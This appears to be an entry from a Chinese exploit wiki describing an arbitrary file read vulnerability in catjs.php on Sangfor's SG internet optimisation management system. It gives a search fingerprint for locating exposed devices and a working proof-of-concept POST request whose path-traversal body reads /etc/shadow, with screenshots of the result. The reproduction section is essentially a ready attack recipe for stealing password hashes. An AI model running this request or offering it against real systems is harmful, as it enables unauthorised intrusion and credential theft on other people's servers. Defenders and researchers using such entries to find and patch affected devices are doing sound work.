# 深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞

## 漏洞描述

深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 漏洞影响

<a-checkbox checked>深信服 SG上网优化管理系统 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>title=="SANGFOR上网优化管理"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1675086253816-a325abd8-8309-4a8f-94d5-b829bd803a8d.png)

验证POC

```plain
POST /php/catjs.php

["../../../../../../etc/shadow"]
```

![img](../../../.vuepress/public/img/1675086290296-c3dffe51-dd0f-45c1-8502-c3680b0fdabb.png)